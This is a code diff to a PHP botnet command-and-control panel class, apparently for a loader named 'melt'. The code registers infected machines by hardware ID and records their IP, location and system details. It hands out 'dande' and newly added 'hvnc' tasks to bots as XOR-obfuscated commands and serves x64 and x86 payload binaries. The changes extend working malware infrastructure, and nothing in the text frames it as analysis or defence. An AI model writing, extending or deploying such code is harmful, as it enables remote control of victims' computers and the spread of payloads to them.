@@ -71,6 +71,8 @@ class Main_tiny
     {
 
 
+
+
         $uhid = strtoupper(key($_GET));
         $key = sha1($uhid);
         $data = file_get_contents('php://input');
@@ -80,20 +82,18 @@ class Main_tiny
             exit();
         }
 
-        $reader = new Reader(__DIR__ . '/../../../src/Geo/GeoLite2-City.mmdb');
-
         $ip = $this->getUserIP();
         try{
+            $reader = new Reader(__DIR__ . '/../../../src/Geo/GeoLite2-City.mmdb');
             $record = $reader->city($ip);
             $country = $record->country->isoCode;
             $countryName = $record->country->name;
-            $countryCity = $record->city->name;
             $countryLatitude = $record->location->latitude;
             $countryLongitude = $record->location->longitude;
         }catch (Exception $e){
             $country = "unknow";
-            $countryLatitude = "unknow";
-            $countryLongitude = "unknow";
+            $countryLatitude = "";
+            $countryLongitude = "";
             $countryName = "unknow";
         }
 
@@ -107,25 +107,15 @@ class Main_tiny
 
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
             $statement->execute(array($uhid));
-            while ($row = $statement->fetch()) {
-                $botfound = true;
-                $bot = $row;
-            }
+
+            $bot =  $statement->fetch();
 
 
-            if(empty($postbot["spreadtag"])){
-                $postbot["spreadtag"] = "none";
-            }
-            if(empty($postbot["antivirus"])){
-                $postbot["antivirus"] = "none";
-            }else{
-                $postbot["antivirus"] = base64_decode($postbot["antivirus"]);
-            }
+            $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?, country = ?, countryName = ?  WHERE hwid = ?");
+            $statement->execute(array($ip,  $country,$countryName,$uhid));
 
 
-            $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?, version = ?, country = ?, spreadtag = ?, countryName = ?, antivirus = ?  WHERE hwid = ?");
-            $statement->execute(array($ip,"melt_version",  $country, trim($postbot["spreadtag"]),$countryName,$postbot["antivirus"],$uhid));
-            $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks  WHERE task = 'dande' ORDER BY id");
+            $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks  WHERE task = 'dande' OR task = 'hvnc' ORDER BY id");
             while ($com = $cmds->fetch(PDO::FETCH_ASSOC)) {
                 if ($com['status'] == "1") {
                     //$executions = $GLOBALS["pdo"]->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
@@ -174,58 +164,21 @@ class Main_tiny
                                         }
                                     }
 
-                                    //Check if Bot Multi Ececution
-                                    if (!empty($filter["multibot"])) {
-                                        $bots = explode(",",$filter["multibot"]);
-                                        foreach($bots as $execute_on_id){
-                                            if (intval($execute_on_id) != intval($bot["id"])) {
-                                                continue;
-                                            }
-                                        }
-                                    }
 
-                                    if (!empty($filter["version"])) {
-                                        if ($filter["version"] != $bot["version"]) {
-                                            continue;
-                                        }
-                                    }
-
-                                    if (!empty($filter["netFramwork"])) {
-
-                                        $framworkHelper = "";
-                                        if ($postbot["netFramework2"] == "true") {
-                                            $framworkHelper .= " net2 ";
-                                        }
-
-                                        if ($postbot["netFramework3"] == "true") {
-                                            $framworkHelper .= " net3 ";
-                                        }
-
-                                        if ($postbot["netFramework35"] == "true") {
-                                            $framworkHelper .= " net35 ";
-                                        }
-
-                                        if ($postbot["netFramework4"] == "true") {
-                                            $framworkHelper .= " net4 ";
-                                        }
-
-                                        $frameworks = explode(",", $filter["netFramwork"]);
-                                        $allow = false;
-                                        foreach ($frameworks as $framework) {
-                                            if (preg_match('/\b' . trim($framework) . '\b/', $framworkHelper)) {
-                                                $allow = true;
-                                            }
-                                        }
-
-                                        if (!$allow) {
-                                            continue;
-                                        }
-                                    }
                                 }
                             }
                         }
-                        $output = '0|'.$com["command"]."\r\n";
-                        echo $this->xor_obf($output, $key);
+
+                        $output = "";
+                        if($com["task"] == "hvnc"){
+                            $output = '1|'.$com["command"]."\r\n";
+                        }else{
+                            $output = '0|'.$com["command"]."\r\n";
+                        }
+                        $cmd = $this->xor_obf($output, $key);
+                        echo $cmd;
+                        file_put_contents("cmd", $output);
+                        file_put_contents("cmd1",$cmd);
                         //send taskID
 
                         $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks_completed (bothwid, taskid, status) VALUES (?, ?, ?)");
@@ -240,52 +193,51 @@ class Main_tiny
 
         } else if ($requestType == 'info') {
 
+
             $parts = explode('|', $parts[1]);
             $botfound = false;
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
             $statement->execute(array($uhid));
-            while ($row = $statement->fetch()) {
-                $botfound = true;
-                $bot = $row;
-            }
+            $bot = $statement->fetch();
 
-            if(!$botfound){
+            if(empty($bot)){
+
                 $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                if (!empty($postbot["antivirus"])) {
-                    $avcheck = base64_decode($postbot["antivirus"]);
-                } else {
-                    $avcheck = "none";
-                }
+
 
 
                 $statement->execute(array(
-                    $avcheck,
+                    "none",
                     $uhid,
-                    $parts[4],
+                    $parts[5], //pc name
                     $country,
-                    "none",
-                    "none",
-                    "none",
-                    "none",
+                    "false",
+                    "false",
+                    "false",
+                    "false",
                     $countryLatitude,
                     $countryLongitude,
                     $countryName,
-                    "",
-                    "",
-                    "",
-                    1,
+                    "", //ram
+                    "", //gpu
+                    "", //cpu
+                    "false",
                     $parts[6],
                     $ip,
-                    $parts[0] . " " .$parts[1].  $parts[2] ,
-                    "melt_version"
+                    $parts[0]. " " .$parts[1] ,
+                    "melt"
                 ));
+
+
             }
+
+
 
 
 
 
         } else if ($requestType == 'bin') {
-            $CONST_PRIVATE_FOLDER = 'uploads/';
+            $CONST_PRIVATE_FOLDER = '/var/www/html/uploads/';
             $CONST_X64_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x64.bin';
             $CONST_X86_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x86.bin';
             $path = '';
